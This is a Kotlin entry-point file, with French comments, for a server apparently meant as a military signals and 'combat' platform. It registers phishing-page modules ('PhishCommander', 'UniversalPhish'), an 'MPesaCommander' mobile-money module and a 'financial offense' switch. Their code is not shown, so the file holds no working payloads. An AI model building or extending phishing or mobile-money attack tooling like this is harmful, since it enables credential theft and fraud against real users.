package com.fardc.sigint.core

// Importation du module IA depuis le dossier Services
import com.fardc.sigint.services.dsp.SignalClassifier 
import io.javalin.Javalin
import java.time.Instant

fun main(args: Array<String>) {
    println("✅ SOVEREIGN CORE v2.4.0 (COMBAT-READY + AI) boot OK")

    // 1. Initialisation du Noyau (Core)
    val vault = SecurityVault() 
    val reporter = MissionReporter(vault)
    val combatHandler = CombatModeHandler() // Cerveau tactique central

    // 2. Initialisation des Modules de Combat et IA
    val bft = BFTModule(combatHandler)
    val mpesa = MPesaCommander(vault, combatHandler)
    val phish = PhishCommander(vault, combatHandler)
    val universal = UniversalPhish(vault, combatHandler)
    
    // Initialisation de l'IA embarquée (SignalClassifier)
    val aiEngine = SignalClassifier(vault, combatHandler)

    // 3. Initialisation du Serveur
    val app = Javalin.create { config ->
        config.showJavalinBanner = false
        config.http.defaultContentType = "application/json; charset=utf-8"
    }.start(7070)

    // 4. Enregistrement des Capacités (Routes)
    bft.setup(app)
    mpesa.setup(app)
    phish.setupPhishPage(app)
    universal.setup(app)
    combatHandler.setupRoutes(app)

    // 5. Endpoints IA (DSP / Inférence)
    app.post("/api/ai/classify") { ctx ->
        val signalData = ctx.bodyAsBytes()
        val result = aiEngine.processInference(signalData)
        
        if (result["status"] == "LOCKED") {
            ctx.status(403).json(result)
        } else {
            ctx.json(result)
        }
    }

    // 6. Endpoints de Gestion et Status
    app.get("/admin/report") { ctx ->
        val mode = combatHandler.getStatus()
        println("📝 [TRIGGER] Rapport généré en mode: $mode")
        reporter.generateDailyReport()
        ctx.result("📊 RAPPORT GÉNÉRÉ - ÉTAT TACTIQUE: $mode")
    }

    app.get("/status") { ctx -> 
        val statusInfo = mapOf(
            "system" to "SOVEREIGN-CORE V2.4.0",
            "status" to "ONLINE",
            "combat_mode" to combatHandler.getStatus(),
            "ai_engine" to if(combatHandler.isPassiveInterceptionEnabled()) "READY" else "OFFLINE",
            "bft_link" to if(combatHandler.isBFTOperational()) "ACTIVE" else "SILENT",
            "cyber_fin" to if(combatHandler.isFinancialOffenseAllowed()) "ARMED" else "LOCKED",
            "timestamp" to Instant.now().toString()
        )
        ctx.json(statusInfo)
    }
}

